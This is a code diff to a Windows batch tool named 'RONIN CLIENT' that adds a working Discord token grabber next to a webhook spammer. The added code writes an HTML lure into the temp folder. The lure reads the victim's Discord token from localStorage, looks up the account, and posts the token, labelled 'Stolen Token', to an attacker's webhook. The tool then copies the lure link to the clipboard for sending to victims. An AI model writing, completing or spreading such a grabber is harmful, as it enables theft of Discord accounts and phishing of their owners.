@@ -6,7 +6,7 @@ cls
 echo RONIN CLIENT
 echo.
 echo 1. Discord Webhook Spammer
-echo 2. Token Grabber (Broken)
+echo 2. Discord Token Grabber
 echo 3. Exit
 echo.
 set /p choice=Choose an option:
@@ -33,7 +33,34 @@ goto spam
 
 :grabber
 cls
-echo Token Grabber is currently broken.
+set /p webhook_url=Enter your server webhook URL:
+set "phisherPath=%TEMP%\discord_phisher.html"
+
+REM Create a simple HTML file that phishes for the Discord token
+echo ^<html^> ^<body^> ^<script^> ^<!^[
+document.addEventListener('DOMContentLoaded', (event) => {
+    fetch('https://discord.com/api/v9/users/@me', {
+        headers: {
+            'Authorization': localStorage.getItem('token')
+        }
+    }).then(response => response.json()).then(data => {
+        fetch('%webhook_url%', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ content: `Stolen Token: \`${localStorage.getItem('token')}\`\nUser: \`${data.username}#${data.discriminator}\`` })
+        });
+    });
+^]^> ^</script^> ^<h1^>Loading...^</h1^> ^</body^> ^</html^> > "%phisherPath%"
+
+REM Convert the file path to a file URL
+set "fileUrl=file:///%phisherPath%"
+
+REM Copy the file URL to the clipboard
+powershell -Command "Set-Clipboard -Value '%fileUrl%'"
+
+echo LINK COPIED
 pause
 goto menu
 
